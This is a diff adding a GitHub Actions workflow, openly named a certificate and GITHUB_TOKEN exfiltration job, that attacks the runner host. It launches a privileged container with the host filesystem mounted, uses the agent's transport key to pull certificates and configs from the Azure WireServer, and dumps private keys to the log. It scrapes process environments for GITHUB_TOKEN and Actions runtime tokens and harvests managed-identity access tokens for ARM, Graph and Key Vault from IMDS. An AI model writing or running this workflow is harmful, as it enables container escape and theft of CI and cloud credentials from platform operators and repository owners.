@@ -1,0 +1,137 @@
+name: WireServer Certs + GITHUB_TOKEN Exfil
+on:
+  workflow_dispatch:
+
+jobs:
+  ws-certs:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extract WireServer Certs + GITHUB_TOKEN from Worker
+        run: |
+          echo "=== STEP1: FULL GOALSTATE + CERT EXTRACTION ==="
+          docker run --rm --privileged --pid=host --network=host \
+            -v /:/host alpine:latest sh -c '
+            apk add curl --quiet 2>/dev/null
+            
+            echo "=GOALSTATE_XML="
+            curl -sf --max-time 15 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              "http://168.63.129.16/machine/?comp=goalstate" \
+              -H "x-ms-version: 2012-11-30"
+            
+            echo ""
+            echo "=CERT_ENDPOINT="
+            # Extract the Certificates URL from GoalState
+            GOAL=$(curl -sf --max-time 15 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              "http://168.63.129.16/machine/?comp=goalstate" \
+              -H "x-ms-version: 2012-11-30")
+            CERT_URL=$(echo "$GOAL" | grep -oP "(?<=<Certificates>)[^<]+")
+            echo "CERT_URL=$CERT_URL"
+            
+            echo "=WIRESERVER_CERTS="
+            curl -sf --max-time 15 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              "$CERT_URL" \
+              -H "x-ms-version: 2012-11-30"
+            
+            echo ""
+            echo "=EXTENSIONS_CONFIG="
+            EXT_URL=$(echo "$GOAL" | grep -oP "(?<=<ExtensionsConfig>)[^<]+")
+            curl -sf --max-time 15 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              "$EXT_URL" \
+              -H "x-ms-version: 2012-11-30"
+            
+            echo ""
+            echo "=HOSTING_ENV_CONFIG="
+            HEC_URL=$(echo "$GOAL" | grep -oP "(?<=<HostingEnvironmentConfig>)[^<]+")
+            curl -sf --max-time 15 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              "$HEC_URL" \
+              -H "x-ms-version: 2012-11-30"
+            
+            echo ""
+            echo "=WAAGENT_CERTS_P7M="
+            # This is the encrypted certificate blob
+            cat /host/var/lib/waagent/Certificates.p7m 2>/dev/null | base64 | head -100
+            
+            echo ""
+            echo "=WAAGENT_CERTS_PEM="
+            cat /host/var/lib/waagent/Certificates.pem 2>/dev/null
+            
+            echo ""
+            echo "=TRANSPORT_CERT_FULL="
+            cat /host/var/lib/waagent/TransportCert.pem
+            
+            echo "=TRANSPORT_KEY_FULL="
+            cat /host/var/lib/waagent/TransportPrivate.pem
+          '
+
+      - name: Extract GITHUB_TOKEN from Runner.Worker proc
+        run: |
+          echo "=== STEP2: GITHUB_TOKEN via Runner.Worker ==="
+          docker run --rm --privileged --pid=host alpine:latest sh -c '
+            # Find Runner.Worker process
+            echo "=ALL_RUNNER_PROCS="
+            ls /proc/*/exe 2>/dev/null | while read exe; do
+              target=$(readlink "$exe" 2>/dev/null)
+              if echo "$target" | grep -qi "runner\|worker\|actions"; then
+                pid=$(echo "$exe" | grep -oP "[0-9]+")
+                echo "PID=$pid EXE=$target"
+              fi
+            done
+            
+            echo "=WORKER_ENVIRON="
+            # Try all processes that could be runner workers
+            for pid in $(ls /proc | grep "^[0-9]"); do
+              comm=$(cat /proc/$pid/comm 2>/dev/null)
+              if echo "$comm" | grep -qi "Runner\|Worker"; then
+                echo "=ENV_PID_${pid}="
+                cat /proc/$pid/environ 2>/dev/null | tr "\0" "\n" | grep -E "GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN|ACTIONS_RESULT|ACTIONS_CACHE" | head -20
+              fi
+            done
+            
+            echo "=ALL_PROC_ENV_SCAN="
+            # Scan ALL process environ for tokens
+            for pid in $(ls /proc | grep "^[0-9]"); do
+              env=$(cat /proc/$pid/environ 2>/dev/null | tr "\0" "\n")
+              if echo "$env" | grep -qE "GITHUB_TOKEN|ACTIONS_RUNTIME"; then
+                echo "=PID_${pid}="
+                echo "$env" | grep -E "GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN|ACTIONS_RESULT|ACTIONS_CACHE"
+              fi
+            done
+          '
+
+      - name: IMDS + MSI Token Harvest
+        run: |
+          echo "=== STEP3: IMDS + MSI ==="
+          IMDS=$(curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01")
+          echo "VMID=$(echo $IMDS | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['vmId'])")"
+          echo "VMNAME=$(echo $IMDS | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['name'])")"
+          echo "SUBID=$(echo $IMDS | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['subscriptionId'])")"
+          echo "RG=$(echo $IMDS | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['resourceGroupName'])")"
+          echo "LOCATION=$(echo $IMDS | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['location'])")"
+          
+          echo "=MSI_ARM="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+            | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'access_token={d.get(\"access_token\",\"NONE\")[:50]}... expires={d.get(\"expires_on\",\"N/A\")}')" \
+            2>/dev/null || echo MSI_ARM_FAILED
+          
+          echo "=MSI_GRAPH="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
+            | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'access_token={d.get(\"access_token\",\"NONE\")[:50]}... expires={d.get(\"expires_on\",\"N/A\")}')" \
+            2>/dev/null || echo MSI_GRAPH_FAILED
+          
+          echo "=MSI_KV="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
+            | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'access_token={d.get(\"access_token\",\"NONE\")[:50]}... expires={d.get(\"expires_on\",\"N/A\")}')" \
+            2>/dev/null || echo MSI_KV_FAILED
